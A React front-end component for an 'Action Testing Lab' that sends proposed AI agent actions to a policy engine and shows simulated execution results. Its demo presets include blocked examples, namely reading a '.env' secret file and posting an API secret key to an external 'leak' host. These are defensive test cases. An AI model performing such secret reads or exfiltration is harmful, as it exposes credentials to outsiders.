import React, { useState } from 'react'
import { apiUrl } from '../config/api'

const ACTION_TYPES = [
  { id: 'READ_FILE', label: 'Read File', desc: 'Read a file from workspace' },
  { id: 'WRITE_FILE', label: 'Write File', desc: 'Write or modify a file' },
  { id: 'DELETE_FILE', label: 'Delete File', desc: 'Remove a workspace file' },
  { id: 'SEND_DATA', label: 'Send Data', desc: 'Transmit data externally' },
  { id: 'RUN_COMMAND', label: 'Run Command', desc: 'Execute a system command' },
]

const DEMO_PRESETS = [
  {
    name: 'Safe File Read',
    expected: 'ALLOW',
    payload: {
      action_type: 'READ_FILE',
      path: 'workspace/reports/quarterly.txt',
      is_sensitive: false,
      is_permitted_location: true,
    },
  },
  {
    name: 'Access .env Secret',
    expected: 'BLOCK',
    payload: {
      action_type: 'READ_FILE',
      path: '.env',
      is_sensitive: true,
      is_permitted_location: false,
    },
  },
  {
    name: 'Safe Workspace Write',
    expected: 'ALLOW',
    payload: {
      action_type: 'WRITE_FILE',
      path: 'workspace/output.log',
      content: 'Agent execution log: Task completed successfully.',
      is_permitted_location: true,
      is_sensitive: false,
    },
  },
  {
    name: 'Delete File',
    expected: 'REVIEW',
    payload: {
      action_type: 'DELETE_FILE',
      path: 'workspace/temp_cache.tmp',
    },
  },
  {
    name: 'External Telemetry',
    expected: 'REVIEW',
    payload: {
      action_type: 'SEND_DATA',
      destination: 'https://api.partner.org/v1/telemetry',
      data: '{"event": "agent_heartbeat", "status": "active"}',
      is_sensitive: false,
    },
  },
  {
    name: 'Exfiltrate Secret Token',
    expected: 'BLOCK',
    payload: {
      action_type: 'SEND_DATA',
      destination: 'https://external-leak.site/ingest',
      data: 'API_SECRET_KEY=sk_live_9921449832749',
      is_sensitive: true,
    },
  },
  {
    name: 'Shell Command',
    expected: 'REVIEW',
    payload: {
      action_type: 'RUN_COMMAND',
      command: 'npm run build',
    },
  },
]

export default function ActionLab({ onActionEvaluated, onActionExecuted }) {
  const [actionType, setActionType] = useState('READ_FILE')
  const [formData, setFormData] = useState({
    path: 'workspace/reports/quarterly.txt',
    content: '',
    destination: 'https://api.external-service.com/webhook',
    data: '',
    command: 'git status',
    is_sensitive: false,
    is_permitted_location: true,
  })

  const [formErrors, setFormErrors] = useState({})
  const [evaluating, setEvaluating] = useState(false)
  const [evalResult, setEvalResult] = useState(null)
  const [evalError, setEvalError] = useState(null)

  const [executing, setExecuting] = useState(false)
  const [execResult, setExecResult] = useState(null)
  const [execError, setExecError] = useState(null)

  // Track the exact payload that was evaluated so execution uses the identical evaluated payload
  const [lastEvaluatedPayload, setLastEvaluatedPayload] = useState(null)

  const handleFieldChange = (field, value) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
    if (formErrors[field]) {
      setFormErrors((prev) => ({ ...prev, [field]: null }))
    }
  }

  const handleActionTypeChange = (newType) => {
    setActionType(newType)
    setFormErrors({})
    setEvalResult(null)
    setEvalError(null)
    setExecResult(null)
    setExecError(null)
    setLastEvaluatedPayload(null)

    // Pre-populate sensible defaults per type
    if (newType === 'READ_FILE') {
      setFormData((prev) => ({
        ...prev,
        path: prev.path || 'workspace/documents/notes.txt',
        is_permitted_location: true,
        is_sensitive: false,
      }))
    } else if (newType === 'WRITE_FILE') {
      setFormData((prev) => ({
        ...prev,
        path: prev.path || 'workspace/output.log',
        content: prev.content || 'Generated report data...',
        is_permitted_location: true,
        is_sensitive: false,
      }))
    } else if (newType === 'DELETE_FILE') {
      setFormData((prev) => ({
        ...prev,
        path: prev.path || 'workspace/temp_cache.tmp',
      }))
    } else if (newType === 'SEND_DATA') {
      setFormData((prev) => ({
        ...prev,
        destination: prev.destination || 'https://api.partner.org/v1/telemetry',
        data: prev.data || '{"metric": "ping"}',
        is_sensitive: false,
      }))
    } else if (newType === 'RUN_COMMAND') {
      setFormData((prev) => ({
        ...prev,
        command: prev.command || 'python -m pytest',
      }))
    }
  }

  const applyPreset = (preset) => {
    const p = preset.payload
    setActionType(p.action_type)
    setFormData({
      path: p.path || '',
      content: p.content || '',
      destination: p.destination || '',
      data: p.data || '',
      command: p.command || '',
      is_sensitive: p.is_sensitive ?? false,
      is_permitted_location: p.is_permitted_location ?? true,
    })
    setFormErrors({})
    setEvalResult(null)
    setEvalError(null)
    setExecResult(null)
    setExecError(null)
    setLastEvaluatedPayload(null)
  }

  const buildPayload = () => {
    const payload = { action_type: actionType }

    if (actionType === 'READ_FILE') {
      payload.path = formData.path.trim()
      payload.is_sensitive = Boolean(formData.is_sensitive)
      payload.is_permitted_location = Boolean(formData.is_permitted_location)
    } else if (actionType === 'WRITE_FILE') {
      payload.path = formData.path.trim()
      payload.content = formData.content
      payload.is_permitted_location = Boolean(formData.is_permitted_location)
      payload.is_sensitive = Boolean(formData.is_sensitive)
    } else if (actionType === 'DELETE_FILE') {
      payload.path = formData.path.trim()
    } else if (actionType === 'SEND_DATA') {
      payload.destination = formData.destination.trim()
      payload.data = formData.data
      payload.is_sensitive = Boolean(formData.is_sensitive)
    } else if (actionType === 'RUN_COMMAND') {
      payload.command = formData.command.trim()
    }

    return payload
  }

  const validate = () => {
    const errors = {}
    if (['READ_FILE', 'WRITE_FILE', 'DELETE_FILE'].includes(actionType)) {
      if (!formData.path || !formData.path.trim()) {
        errors.path = 'File path is required.'
      }
    }
    if (actionType === 'SEND_DATA') {
      if (!formData.destination || !formData.destination.trim()) {
        errors.destination = 'Destination URL or endpoint is required.'
      }
    }
    if (actionType === 'RUN_COMMAND') {
      if (!formData.command || !formData.command.trim()) {
        errors.command = 'Command string is required.'
      }
    }

    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  const handleEvaluate = async (e) => {
    e.preventDefault()
    if (!validate()) return

    setEvaluating(true)
    setEvalError(null)
    setEvalResult(null)
    setExecResult(null)
    setExecError(null)

    const payload = buildPayload()

    try {
      const response = await fetch(apiUrl('/evaluate'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}))
        throw new Error(errorData.detail || `Evaluation failed with status ${response.status}`)
      }

      const result = await response.json()
      setEvalResult(result)
      setLastEvaluatedPayload(payload)
      if (onActionEvaluated) {
        onActionEvaluated()
      }
    } catch (err) {
      setEvalError(err.message || 'Failed to connect to /evaluate endpoint.')
    } finally {
      setEvaluating(false)
    }
  }

  const handleExecute = async () => {
    if (!lastEvaluatedPayload) return

    setExecuting(true)
    setExecError(null)
    setExecResult(null)

    try {
      const response = await fetch(apiUrl('/execute'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(lastEvaluatedPayload),
      })

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}))
        throw new Error(errorData.detail || `Execution failed with status ${response.status}`)
      }

      const result = await response.json()
      setExecResult(result)
      if (onActionExecuted) {
        onActionExecuted()
      }
    } catch (err) {
      setExecError(err.message || 'Failed to connect to /execute endpoint.')
    } finally {
      setExecuting(false)
    }
  }

  return (
    <section className="action-lab-card card" aria-label="Action Testing Lab">
      <div className="card-header-main">
        <div>
          <h2 className="card-title">Action Testing Lab</h2>
          <p className="card-subtitle">
            Configure a proposed agent action, evaluate it against the PolicyEngine, and safely test execution.
          </p>
        </div>
      </div>

      {/* Preset demo buttons */}
      <div className="presets-wrapper">
        <span className="presets-label">Demo Quick Presets:</span>
        <div className="presets-list">
          {DEMO_PRESETS.map((preset) => (
            <button
              key={preset.name}
              type="button"
              className="btn-preset"
              onClick={() => applyPreset(preset)}
              title={`Load preset '${preset.name}' (Expected: ${preset.expected})`}
            >
              <span>{preset.name}</span>
              <span className={`pill-micro pill-${preset.expected.toLowerCase()}`}>
                {preset.expected}
              </span>
            </button>
          ))}
        </div>
      </div>

      {/* Action Type Selector */}
      <div className="type-selector-wrapper">
        <label className="input-label">Action Category</label>
        <div className="type-buttons-grid">
          {ACTION_TYPES.map((type) => (
            <button
              key={type.id}
              type="button"
              className={`btn-type-tab ${actionType === type.id ? 'active' : ''}`}
              onClick={() => handleActionTypeChange(type.id)}
            >
              <span className="type-name">{type.label}</span>
              <span className="type-desc">{type.desc}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Form Fields */}
      <form onSubmit={handleEvaluate} className="action-form">
        {/* Path field for File actions */}
        {['READ_FILE', 'WRITE_FILE', 'DELETE_FILE'].includes(actionType) && (
          <div className="form-group">
            <label htmlFor="input-path" className="input-label">
              File Target Path <span className="req">*</span>
            </label>
            <input
              id="input-path"
              type="text"
              className={`text-input font-mono ${formErrors.path ? 'input-error' : ''}`}
              placeholder="e.g. workspace/data.txt or .env"
              value={formData.path}
              onChange={(e) => handleFieldChange('path', e.target.value)}
            />
            {formErrors.path && <span className="error-text">{formErrors.path}</span>}
          </div>
        )}

        {/* Content field for WRITE_FILE */}
        {actionType === 'WRITE_FILE' && (
          <div className="form-group">
            <label htmlFor="input-content" className="input-label">
              File Content (Simulated)
            </label>
            <textarea
              id="input-content"
              rows={3}
              className="text-input textarea font-mono"
              placeholder="Enter text content to write into virtual workspace..."
              value={formData.content}
              onChange={(e) => handleFieldChange('content', e.target.value)}
            />
          </div>
        )}

        {/* Destination & Data fields for SEND_DATA */}
        {actionType === 'SEND_DATA' && (
          <>
            <div className="form-group">
              <label htmlFor="input-destination" className="input-label">
                Destination URL / Host <span className="req">*</span>
              </label>
              <input
                id="input-destination"
                type="text"
                className={`text-input font-mono ${formErrors.destination ? 'input-error' : ''}`}
                placeholder="https://api.external-partner.com/webhook"
                value={formData.destination}
                onChange={(e) => handleFieldChange('destination', e.target.value)}
              />
              {formErrors.destination && <span className="error-text">{formErrors.destination}</span>}
            </div>

            <div className="form-group">
              <label htmlFor="input-data" className="input-label">
                Data Payload Preview
              </label>
              <textarea
                id="input-data"
                rows={2}
                className="text-input textarea font-mono"
                placeholder="Data payload to transmit..."
                value={formData.data}
                onChange={(e) => handleFieldChange('data', e.target.value)}
              />
            </div>
          </>
        )}

        {/* Command field for RUN_COMMAND */}
        {actionType === 'RUN_COMMAND' && (
          <div className="form-group">
            <label htmlFor="input-command" className="input-label">
              Command String <span className="req">*</span>
            </label>
            <input
              id="input-command"
              type="text"
              className={`text-input font-mono ${formErrors.command ? 'input-error' : ''}`}
              placeholder="e.g. python -m pytest or git status"
              value={formData.command}
              onChange={(e) => handleFieldChange('command', e.target.value)}
            />
            {formErrors.command && <span className="error-text">{formErrors.command}</span>}
          </div>
        )}

        {/* Flags / Checkboxes */}
        <div className="checkboxes-row">
          {['READ_FILE', 'WRITE_FILE'].includes(actionType) && (
            <label className="checkbox-label">
              <input
                type="checkbox"
                checked={formData.is_permitted_location}
                onChange={(e) => handleFieldChange('is_permitted_location', e.target.checked)}
              />
              <span>Explicitly verified workspace location</span>
            </label>
          )}

          {['READ_FILE', 'WRITE_FILE', 'SEND_DATA'].includes(actionType) && (
            <label className="checkbox-label checkbox-sensitive">
              <input
                type="checkbox"
                checked={formData.is_sensitive}
                onChange={(e) => handleFieldChange('is_sensitive', e.target.checked)}
              />
              <span>Flag as sensitive / secret data</span>
            </label>
          )}
        </div>

        {/* Submit Button */}
        <div className="form-actions">
          <button type="submit" className="btn-primary" disabled={evaluating}>
            {evaluating ? (
              <>
                <span className="spinner" aria-hidden="true" />
                <span>Evaluating Policy...</span>
              </>
            ) : (
              <>
                <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <polygon points="5 3 19 12 5 21 5 3" />
                </svg>
                <span>Evaluate Proposed Action</span>
              </>
            )}
          </button>
        </div>
      </form>

      {/* Evaluation Error */}
      {evalError && (
        <div className="alert alert-error" role="alert">
          <strong>Evaluation Error:</strong> {evalError}
        </div>
      )}

      {/* Evaluation Result Display */}
      {evalResult && (
        <div className={`eval-result-box eval-border-${evalResult.decision?.toLowerCase()}`}>
          <div className="eval-result-header">
            <span className="eval-title">Policy Evaluation Result</span>
            <span className={`pill-decision pill-${evalResult.decision?.toLowerCase()}`}>
              {evalResult.decision}
            </span>
          </div>

          <div className="eval-details-grid">
            <div className="eval-field">
              <span className="field-label">Action Category:</span>
              <span className="field-val font-mono">{evalResult.action_type}</span>
            </div>
            <div className="eval-field full-width">
              <span className="field-label">Policy Reason:</span>
              <span className="field-val">{evalResult.reason}</span>
            </div>
          </div>

          {/* Controlled Execution Section */}
          <div className="execution-control-panel">
            <div className="execution-notice">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="info-icon">
                <circle cx="12" cy="12" r="10" />
                <line x1="12" y1="16" x2="12" y2="12" />
                <line x1="12" y1="8" x2="12.01" y2="8" />
              </svg>
              <span>
                <strong>Controlled Sandbox:</strong> Simulated in an isolated in-memory workspace. Real shell commands, disk alterations, or network calls are never performed.
              </span>
            </div>

            <button
              type="button"
              className={`btn-execute btn-execute-${evalResult.decision?.toLowerCase()}`}
              onClick={handleExecute}
              disabled={executing}
            >
              {executing ? (
                <>
                  <span className="spinner" aria-hidden="true" />
                  <span>Executing Simulation...</span>
                </>
              ) : (
                <>
                  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="16 18 22 12 16 6" />
                    <polyline points="8 6 2 12 8 18" />
                  </svg>
                  <span>Execute Action (Simulated)</span>
                </>
              )}
            </button>
          </div>

          {/* Execution Error */}
          {execError && (
            <div className="alert alert-error mt-3" role="alert">
              <strong>Execution Error:</strong> {execError}
            </div>
          )}

          {/* Execution Result Display */}
          {execResult && (
            <div className="exec-result-box">
              <div className="exec-result-header">
                <span className="exec-label">Execution Outcome:</span>
                <span className={`pill-exec-status status-${execResult.execution_status?.toLowerCase()}`}>
                  {execResult.execution_status}
                </span>
              </div>
              <p className="exec-message">{execResult.message}</p>

              {execResult.simulated_result && (
                <div className="simulated-result-wrap">
                  <span className="code-label">Simulated Environment Data:</span>
                  <pre className="simulated-code">
                    {JSON.stringify(execResult.simulated_result, null, 2)}
                  </pre>
                </div>
              )}
            </div>
          )}
        </div>
      )}
    </section>
  )
}
